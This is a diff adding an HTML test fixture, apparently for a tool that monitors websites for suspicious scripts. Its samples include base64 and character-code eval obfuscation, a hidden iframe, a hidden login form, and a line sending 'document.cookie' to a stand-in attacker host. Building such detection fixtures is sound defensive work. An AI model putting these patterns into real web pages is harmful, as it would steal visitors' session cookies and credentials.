@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test HTML File</title>
+</head>
+<body>
+    <h1>HTML Test File for Monitoring the website</h1>
+    
+    <!-- Normal script -->
+    <script>
+        console.log("This is a normal script");
+        
+        // Regular DOM manipulation
+        document.getElementById("demo").innerHTML = "Hello World!";
+    </script>
+    
+    <!-- Suspicious script with obfuscated code -->
+    <script>
+        // Base64 encoded JavaScript
+        eval(atob("YWxlcnQoIlRoaXMgaXMgcG90ZW50aWFsbHkgc3VzcGljaW91cyBjb2RlISIpOw=="));
+        
+        // Obfuscated function call
+        setTimeout("eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,39,72,101,108,108,111,39,41))", 1000);
+        
+        // Hidden iframe
+        document.write("<iframe src='https://example.com' style='display:none'></iframe>");
+        
+        // String manipulation to hide "document.cookie"
+        var x = "docu" + "ment.c" + "ookie";
+        var data = eval(x);
+        
+        // Data exfiltration simulation
+        new Image().src = "https://malicious-site.com/steal?data=" + encodeURIComponent(data);
+    </script>
+    
+    <!-- Hidden malicious form -->
+    <form id="hidden_form" style="display:none">
+        <input type="text" name="username" id="username">
+        <input type="password" name="password" id="password">
+    </form>
+</body>
+</html> 
